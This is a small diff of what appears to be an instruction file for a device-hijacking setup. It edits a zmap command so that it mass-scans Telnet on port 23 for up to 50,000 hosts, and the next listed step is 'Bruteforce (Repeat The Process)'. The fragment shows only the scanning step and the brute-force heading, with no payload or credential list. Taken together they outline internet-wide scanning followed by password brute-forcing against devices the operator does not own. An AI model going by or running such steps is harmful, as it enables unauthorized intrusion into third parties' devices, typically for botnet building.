@@ -8,7 +8,7 @@ sh zmap_auto_install.sh
 
 - Scan Telnet Ips
 
-zmap -p22 -o mfu.txt -w Legend.lst 
+zmap -p23 -o mfu.txt -N 50000 
 
 - Bruteforce (Repeat The Process)
 
